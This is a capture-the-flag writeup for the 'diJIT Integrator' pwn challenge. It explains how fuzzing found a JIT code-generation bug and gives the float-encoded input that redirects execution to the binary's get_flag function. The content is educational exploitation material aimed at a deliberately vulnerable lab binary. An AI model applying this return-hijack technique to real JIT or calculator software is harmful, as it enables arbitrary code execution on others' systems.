---
layout: post
title: "Graz Security Week 2018: diJIT Integrator"
author: mickdermack
categories: writeup
tags: [cat/pwn, tool/afl, vuln/custom-jit]
---

* **Category:** pwn
* **Points:** 150
* **Description:**

> This calculator uses a just-in-time compiler (JIT) to compile the entered function into x86 machine code, allowing fast numeric integration of the function.
>
> What could possibly go wrong when compiling (untrusted) user input and executing it?
>
> Play around at hacklets3.attacking.systems 8006


## Writeup

This year, a few fuzzys were invited to the summer school of Graz Security Week.
One of the people from IAIK hosted a CTF with some really nice challenges, one of
which was the "diJIT Integrator".


## The Challenge

There was one file named "dijit-integrator" attached to the challenge. Running
`file` on it shows that it is a 64-bit x86 ELF binary which hasn't been stripped of
symbols:
```
dijit-plot: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, [...], not stripped
```

To find out which mitigations a binary uses, the `checksec` utility can be used,
which promptly revealed that the binary implements Stack Canaries, partial RELRO,
but not ASLR.

When run, the binary asks for an expression and some parameters, and then attempts
to integrate the expression numerically:
```
+-----------------------------------------------+
|     TU Instruments - Numeric Integration      |
+-----------------------------------------------+

Expression: 4*x
From [default: -10]: 
To [default: 10]: 
Step size [default: 1]: 
From: -10.000000 To: 10.000000
Step size: 1.000000

   _
  / ' 10.000000
  |
  |
  |   4*x dx = -40.000000
  |
  |
._/ -10.000000
```


## The JIT

The program implements a Just-in-Time compiler (JIT) for compiling the arithmetic
expression into x86 machine code, which could potentially run much faster than
repeatedly interpreting the expression.

The JIT uses the Shunting Yard algorithm to convert the expression in infix notation
to a postfix form, which is then translated into x86 machine code, using the stack
as an operand stack. For example, the expression `20+x` is compiled into the
following x86 code:
```
   0x3f800000:	pushq  $0x41a00000
   0x3f800005:	push   %rcx
   0x3f800006:	pop    %rax
   0x3f800007:	mov    %eax,(%rbx)
   0x3f800009:	flds   (%rbx)
   0x3f80000b:	pop    %rax
   0x3f80000c:	mov    %eax,(%rbx)
   0x3f80000e:	flds   (%rbx)
   0x3f800010:	faddp  %st,%st(1)
   0x3f800012:	fstps  (%rbx)
   0x3f800014:	pushq  (%rbx)
   0x3f800016:	popq   (%rbx)
   0x3f800018:	retq
   0x3f800019:	retq
```

Because a flawless JIT would make for quite a boring challenge, the JIT contains a
bug.


## The Vulnerability

The [afl fuzzer](http://lcamtuf.coredump.cx/afl/) was used to search for inputs that
crash the program. It took only a few minutes to find the following exploitable bug.

If an expression with two consecutive operators, like `1//2` or `10++20`, is fed
into the JIT, code generation aborts after emitting a `push` of the first operand:
```
   0x3f800000:	pushq  $0x41200000
   0x3f800005:	retq
   0x3f800006:	retq
```

`0x41200000` is the floating point number 10, interpreted as an integer. Because the
number is read from the user and the JIT always emits at least one return
instruction at the end, this can be exploited to jump to an arbitrary address.


## The Attack

Conveniently, the binary contains a `get_flag` function which, when run, outputs the
flag. Its address fits neatly into a 32-bit variable, so it is possible to encode it
as a floating-point number. Python's `struct.pack` and `struct.unpack` can be used
to for that purpose:
```
In [1]: from struct import pack, unpack

In [2]: f = unpack("f", pack("i", 0x6412678C))[0]

In [3]: "{:22f}".format(f)
Out[3]: '10802743893776962420736.000000'
```

Indeed, when an expression like `10802743893776962420736++1` is input, we get the
flag:
```
+-----------------------------------------------+
|     TU Instruments - Numeric Integration      |
+-----------------------------------------------+

Expression: 10802743893776962420736++1
From [default: -10]: 
To [default: 10]: 
Step size [default: 1]: 
From: -10.000000 To: 10.000000
{M4TH_R0CKS}
```
